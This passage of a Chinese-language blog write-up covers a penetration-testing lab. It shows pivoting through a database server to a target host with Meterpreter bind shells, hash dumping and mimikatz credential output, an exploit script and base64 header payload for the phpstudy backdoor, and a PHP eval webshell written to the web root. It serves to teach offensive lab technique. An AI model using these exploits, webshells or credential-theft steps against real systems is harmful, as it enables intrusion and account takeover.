+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.30.38.png" alt="截屏2022-06-04 15.30.38"></p>
+<p>将木马<code>mac2.exe</code>通过站点木马中的 MSSQL 数据库连接函数完成上传<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.31.23.png" alt="截屏2022-06-04 15.31.23"></p>
+<p>执行上传木马，在数据库服务器中开启 12222 端口<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.35.33.png" alt="截屏2022-06-04 15.35.33"></p>
+<p>使用 MSF 开启监听以获取数据库服务器的权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf &gt; set rhost 10.10.10.131</span><br><span class="line">msf &gt; set lport 12222</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.54.38.png" alt="截屏2022-06-04 15.54.38"></p>
+<p>同理将进程迁移到系统进程当中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">meterperter &gt; migrate 596</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.02.39.png" alt="截屏2022-06-04 16.02.39"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.03.17.png" alt="截屏2022-06-04 16.03.17"></p>
+<p>查看网络信息发现目标存在两个IP地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ifconfig</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.23.44.png" alt="截屏2022-06-04 16.23.44"><br>IP地址分别如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.131</span><br><span class="line">10.10.1.129</span><br></pre></td></tr></table></figure>
+<p>通过利用模块<code>get_local_subnets</code>查看当前网段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.25.07.png" alt="截屏2022-06-04 16.25.07"><br>IP网段分别如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.0/24</span><br><span class="line">10.10.1.0/24</span><br></pre></td></tr></table></figure>
+<p>获取数据库服务器哈希值，与此同时加载 mimikatz 获取明文</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; creds_msv</span><br><span class="line">meterpreter &gt; creds_kerberos</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.08.21.png" alt="截屏2022-06-04 16.08.21"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:15132c3d36a7e5d7905e02b478979046:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+<p>未获取到明文的原因是我们并未登录数据库，一旦登录数据库服务器，服务器中就会保留我们的密码信息，再次获取后成功拿到数据库明文密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.15.00.png" alt="截屏2022-06-04 16.15.00"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username          Domain           Password</span><br><span class="line">--------          ------           --------</span><br><span class="line">Administrator     WIN-JJU7KU45PN7  !@#QWEasd123.</span><br></pre></td></tr></table></figure>
+<p>在管理员目录中成功拿到第三个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd C:/Users/Administrator</span><br><span class="line">meterpreter &gt; cat root.txt.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.58.28.png" alt="截屏2022-06-04 19.58.28"></p>
+<h3 id="渗透目标服务器"><a href="#渗透目标服务器" class="headerlink" title="渗透目标服务器"></a>渗透目标服务器</h3><p>通过 MSF 添加目标网段<code>10.10.1.0/24</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.1.0/24</span><br><span class="line">run autoroute -p </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.33.50.png" alt="截屏2022-06-04 16.33.50"></p>
+<p>使用代理对目标主机进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn 10.10.1.128</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.35.47.png" alt="截屏2022-06-04 16.35.47"></p>
+<p>端口扫描结果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.59.56.png" alt="截屏2022-06-04 16.59.56"></p>
+<p>通过代理访问目标80端口，为 phpstudy 界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2017.03.16.png" alt="截屏2022-06-04 17.03.16"></p>
+<p>众所周知在 phpstudy 中存在一个后门，影响版本如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpstudy 2016 php-5.4</span><br><span class="line">phpstudy 2018 php-5.2.17</span><br><span class="line">phpstudy 2018 php-5.4.45</span><br></pre></td></tr></table></figure>
+<p>通过 BurpSuite 抓包修改请求头，测试该站点是否存在该漏洞（<strong>需要注意的是 BurpSuite 也要设置代理，否则无法访问到 10.10.1.0/24 网段</strong>）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-charset: c3lzdGVtKCd3aG9hbWknKTs=</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.20.43.png" alt="截屏2022-06-04 18.20.43"></p>
+<p>但是并未执行成功，尝试编写 python 脚本进行自动化执行命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#conding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;system(&#x27;&quot;</span>+sys.argv[<span class="number">1</span>]+<span class="string">&quot;&#x27;);&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://10.10.1.128&quot;</span></span><br><span class="line"></span><br><span class="line">socks.set_default_proxy(socks.SOCKS5, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2222</span>)</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line"></span><br><span class="line">command_bs64 = base64.b64encode(command.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="comment">#print(command_bs64)</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Accept-charset&#x27;</span>:command_bs64,<span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate&#x27;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">target_url</span>):</span></span><br><span class="line">	req = requests.get(url, headers=headers).text</span><br><span class="line">	<span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(exp(url))</span><br></pre></td></tr></table></figure>
+<p>通过命令<code>&quot;echo ^&lt;?php @eval(\$_POST[\&quot;shell\&quot;])?^&gt;&gt;c:\phpstudy\WWW\shell.php&quot;</code>成功写入shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py &quot;echo ^&lt;?php @eval(\$_POST[\&quot;mac\&quot;])?^&gt;&gt;c:\phpstudy\WWW\shell.php&quot;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.44.15.png" alt="截屏2022-06-04 18.44.15"><br>访问木马<code>shell.php</code>存在，说明成功写入<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.49.08.png" alt="截屏2022-06-04 18.49.08"></p>
+<p>在菜刀中设置 socks 代理<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.53.01.png" alt="截屏2022-06-04 18.53.01"></p>
+<p>设置木马地址以及密码后点击连接即可成功访问到目标服务器<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2018.58.14.png" alt="截屏2022-06-04 18.58.14"></p>
+<p>通过命令执行发现当前权限为 SYSTEM<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.02.08.png" alt="截屏2022-06-04 19.02.08"></p>
+<p>我们还是和之前一样上传 MSF 生成的木马<code>mac2.exe</code>，通过命令<code>c:\mac2.exe</code>执行木马<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.05.16.png" alt="截屏2022-06-04 19.05.16"></p>
+<p>查看端口发现12222端口已开放，说明木马运行成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.06.09.png" alt="截屏2022-06-04 19.06.09"></p>
+<p>使用 MSF 建立监听，通过正向连接成功获取目标服务器权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">msf &gt; set rhost 10.10.1.128</span><br><span class="line">msf &gt; set lport 12222</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.11.33.png" alt="截屏2022-06-04 19.11.33"></p>
+<p>将当前进程迁移至系统进程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">meterpreter &gt; migrate 468</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.14.38.png" alt="截屏2022-06-04 19.14.38"></p>
+<p>获取哈希值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure>
+<p>通过加载 mimikatz 获取明文密码信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2019.15.18.png" alt="截屏2022-06-04 19.15.18"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Username       Domain     Password</span><br><span class="line">--------       ------     --------</span><br><span class="line">Administrator  TARGET     !@#QWEasd123.</span><br><span class="line"><span class="meta">target$</span><span class="bash">        WORKGROUP  (null)</span></span><br></pre></td></tr></table></figure>
+<p>对应的哈希值如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:15132c3d36a7e5d7905e02b478979046:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+<p>在管理员目录当中发现最后一个flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cd C:/Users/Administrator</span><br><span class="line">meterpreter &gt; cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2020.00.17.png" alt="截屏2022-06-04 20.00.17"></p>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>web 服务器部署方式为站库分离，因此假设我们拿下数据库也无法出网，幸好它的几个子域名中存在多个漏洞，我们可利用这些攻击面来进行攻击。前期 dedecms 存在SQL注入，通过该漏洞我们发现了后台的账号密码，成功登录后台发现服务器文件管理界面，那么自然地上传木马就可成功拿到 IIS 权限，使用烂土豆（MS16-075）将其提权至系统权限。除此之外还发现 grcms 的管理登录口存在SQL注入以及弱口令，由于数据库权限为sa，我们也获得了数据库服务器的系统权限。当然.NET代码审计也能拿到许多漏洞，审计完成后直接进入内网渗透环节，建立代理后在 MSF 中可拿到数据库服务器的系统权限。在数据库服务器中发现另一个网段，其中存在目标服务器，利用 phpstudy 后门漏洞也拿到了该服务器的系统权限。同理也能够上线 MSF。该靶场非常贴近实战，非常值得我们学习渗透，思路的养成也不是一朝一夕，只有通过反复的锻炼才能形成。 </p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/a345616c/">HTB: Popcorn<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/240eacf2/">数据库攻防之MySQL<span class="note">Newer</span></a></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
